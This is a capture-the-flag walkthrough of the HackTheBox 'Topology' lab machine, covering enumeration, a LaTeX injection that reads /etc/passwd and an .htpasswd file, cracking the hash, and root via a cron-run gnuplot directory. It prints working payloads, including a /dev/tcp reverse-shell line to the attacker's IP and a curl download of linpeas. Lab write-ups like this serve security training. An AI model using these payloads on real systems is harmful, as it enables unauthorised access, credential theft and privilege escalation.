---
title: "HackTheBox Topology Walkthrough — LaTeX Injection to Gnuplot Privilege Escalation"
description: "Step-by-step HTB Topology writeup: nmap enumeration, vhost fuzzing, LaTeX injection to read /etc/passwd, cracking an htpasswd hash with John, and exploiting a gnuplot cron job for root."
keywords: ["HackTheBox Topology", "HTB Topology walkthrough", "LaTeX injection", "gnuplot privilege escalation", "htpasswd john the ripper", "cron gnuplot exploit", "pentest writeup", "CTF walkthrough"]
author: "Onurcan Genç"
date: 2026-04-14
tags: [HackTheBox, CTF, LaTeX Injection, Privilege Escalation, Linux, Web Exploitation]
---

# HackTheBox Topology Walkthrough — From LaTeX Injection to Root via Gnuplot

The **HackTheBox Topology** machine is an easy-rated Linux box that chains together classic web enumeration, a **LaTeX injection vulnerability**, credential cracking with **John the Ripper**, and a **gnuplot + cron privilege escalation** path. This writeup walks through the full kill chain, explains the reasoning behind each pivot, and links to the references I relied on so you can reproduce (and understand) every step.

> **TL;DR:** Enumerate → find a LaTeX-rendering endpoint → bypass sanitization with `$...$` delimiters → read `.htpasswd` → crack the MD5 crypt hash → SSH in as `vdaisley` → abuse a world-writable `/opt/gnuplot/*.plt` directory that cron executes as root.

---

## 1. Initial Setup

Start by adding the target IP address to your `/etc/hosts` file:

![[HackTheBox/Topology/images/2.png]]

## 2. Reconnaissance and Enumeration

### 2.1 Nmap Port Scan

First, I ran a service and script scan to enumerate open ports:

```bash
sudo nmap -sV -sC topology.htb
```

![[HackTheBox/Topology/images/1.png]]

### 2.2 Directory Brute-Force with Dirsearch

Next, I brute-forced the web root for hidden paths:

```bash
dirsearch -u http://topology.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![[HackTheBox/Topology/images/4.png]]

The port `80` landing page redirected to another domain, and fuzzing did not reveal anything juicy:

![[HackTheBox/Topology/images/3.png]]

I added the custom domain to `/etc/hosts` and moved on.

## 3. Discovering the LaTeX Rendering Endpoint

The secondary domain hosts a PHP script that renders LaTeX expressions into images based on user input:

![[HackTheBox/Topology/images/5.png]]

A very useful reference for crafting LaTeX command-injection payloads:

- [PayloadsAllTheThings — LaTeX Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/#summary)

## 4. Exploiting the LaTeX Injection Vulnerability

### 4.1 Initial Payload Attempts

I first tried `\input{/etc/passwd}`, but the page sanitized it:

![[HackTheBox/Topology/images/6.png]]

Most of the common payloads were also blocked. Two additional references helped me find more advanced ones:

- [LaTeX to RCE — InfoSec Writeups](https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [Hacking with LaTeX — 0day.work](https://0day.work/hacking-with-latex/)

![[HackTheBox/Topology/images/7.png]]

The endpoint could not parse the entire `/etc/passwd`, but it confirmed the input field was vulnerable to **LaTeX injection**:

![[HackTheBox/Topology/images/8.png]]

### 4.2 Virtual Host (vhost) Enumeration

Unable to achieve RCE, I pivoted to **vhost enumeration**:

```bash
ffuf -H "Host: FUZZ.topology.htb" -H "User-Agent: PENTEST" -c \
     -w "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt" \
     -u http://topology.htb
```

Interesting results surfaced:

![[HackTheBox/Topology/images/9.png]]

![[HackTheBox/Topology/images/11.png]]

I had not yet added the `dev` subdomain to `/etc/hosts`:

![[HackTheBox/Topology/images/10.png]]

After adding it:

![[HackTheBox/Topology/images/12.png]]

### 4.3 Bypassing Sanitization with Dollar-Sign Delimiters

The `dev` subdomain enforced HTTP Basic Auth, so I went back to refining the LaTeX payload. HackTricks has an excellent reference:

- [HackTricks — Formula/CSV/Doc/LaTeX/Ghostscript Injection](https://hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html)

`\lstinputlisting{/etc/hosts}` alone still failed. LaTeX uses specific characters to trigger commands (see the [Overleaf docs on Commands](https://www.overleaf.com/learn/latex/Commands)), so I wrapped the payload in dollar signs to enter math mode:

![[HackTheBox/Topology/images/13.png]]

```latex
$\lstinputlisting{/etc/passwd}$
```

This successfully reads `/etc/passwd`:

![[HackTheBox/Topology/images/14.png]]

## 5. Reading .htaccess and .htpasswd on the Dev Subdomain

Configuration files in common paths returned errors, but path reasoning pointed toward the `dev` subdomain:

```latex
$\lstinputlisting{/var/www/dev/.htaccess}$
```

![[HackTheBox/Topology/images/15.png]]

Pivoting to the credential file:

```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

![[HackTheBox/Topology/images/16.png]]

Captured hash:

```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

## 6. Cracking the Hash with John the Ripper

### 6.1 Identifying the Hash Type

```bash
hash-identifier
# HASH: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

![[HackTheBox/Topology/images/17.png]]

John automatically detected the type (MD5 crypt / Apache APR1) and suggested the correct `--format` argument.

### 6.2 Running John

```bash
john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt
john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
john --show md5.txt
```

![[HackTheBox/Topology/images/18.png]]

Cracked password: `calculus20`.

## 7. SSH as `vdaisley` and Capturing the User Flag

```bash
ssh vdaisley@topology.htb   # password: calculus20
```

It worked:

![[HackTheBox/Topology/images/19.png]]

```bash
cat /user.txt
```

`sudo -l` was disabled on this host:

![[HackTheBox/Topology/images/20.png]]

## 8. Privilege Escalation — Abusing a Gnuplot Cron Job

### 8.1 Running LinPEAS

Transferring and running `linpeas.sh` on the target:

```bash
# Attacker
python -m http.server 1000

# Target (writable directory)
curl http://10.10.16.64:1000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

After an hour or two of triage, the most promising finding was a binary/directory with unusual read and write permissions:

![[HackTheBox/Topology/images/21.png]]

Write permissions on the `gnuplot` working directory:

![[HackTheBox/Topology/images/22.png]]

### 8.2 Checking GTFOBins

Because of the binary's privileges, I reviewed **GTFOBins** for applicable SUID tricks:

![[HackTheBox/Topology/images/23.png]]

Direct SUID exploitation did not pan out:

![[HackTheBox/Topology/images/24.png]]

### 8.3 Identifying the Cron Trigger on `.plt` Files

Since I had write permissions on `/opt/gnuplot/`, the next question was whether a cron job was polling that directory. Reference on `gnuplot` file extensions:

- [Stack Overflow — Standard file extension for gnuplot files](https://stackoverflow.com/questions/5497889/is-there-a-standard-file-extension-for-gnuplot-files)

![[HackTheBox/Topology/images/25.png]]

I dropped test files with different extensions:

```bash
# Did not trigger
echo 'system("touch /tmp/E")' > /opt/gnuplot/E.sh

# Triggered successfully
echo 'system("touch /tmp/ErkanUcar2")' > /opt/gnuplot/cuneyt2.plt
```

![[HackTheBox/Topology/images/26.png]]

Confirmed: cron picks up `.plt` files in `/opt/gnuplot/` and executes whatever is inside the `system()` call as root.

### 8.4 Rooting the Box

Option A — full reverse shell (using [penelope](https://github.com/brightio/penelope)):

```bash
penelope -p 443

echo 'system("sh -i >& /dev/tcp/10.10.16.64/443 0>&1")' \
  > /opt/gnuplot/OumoutChouseinoglou.plt
```

![[HackTheBox/Topology/images/27.png]]

Option B — direct flag exfiltration (simpler and faster):

```bash
echo 'system("cat /root/root.txt > /tmp/flag.txt")' \
  > /opt/gnuplot/onurcan.plt
```

![[HackTheBox/Topology/images/28.png]]

Instead of waiting for a reverse shell to stabilize, this approach closes out the entire privilege-escalation vector in a single command.

---

## 9. Key Takeaways

- **LaTeX injection** can be a silent killer — even heavily sanitized endpoints may still accept math-mode (`$...$`) delimiters.
- Always enumerate **virtual hosts** when a web app references domains you cannot resolve directly.
- `.htaccess` and `.htpasswd` files remain valuable LFI targets on Apache-based stacks.
- When `sudo -l` is disabled, look for **writable directories polled by cron jobs**, especially tied to interpreters like `gnuplot`, `python`, or `awk` that expose a `system()`-style primitive.
- **GTFOBins** and **PayloadsAllTheThings** remain indispensable reference material for every pentester.

## 10. References

- [PayloadsAllTheThings — LaTeX Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/#summary)
- [HackTricks — Formula/CSV/Doc/LaTeX/Ghostscript Injection](https://hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html)
- [LaTeX to RCE — InfoSec Writeups](https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [Hacking with LaTeX — 0day.work](https://0day.work/hacking-with-latex/)
- [Overleaf — LaTeX Commands](https://www.overleaf.com/learn/latex/Commands)
- [GTFOBins](https://gtfobins.github.io/)
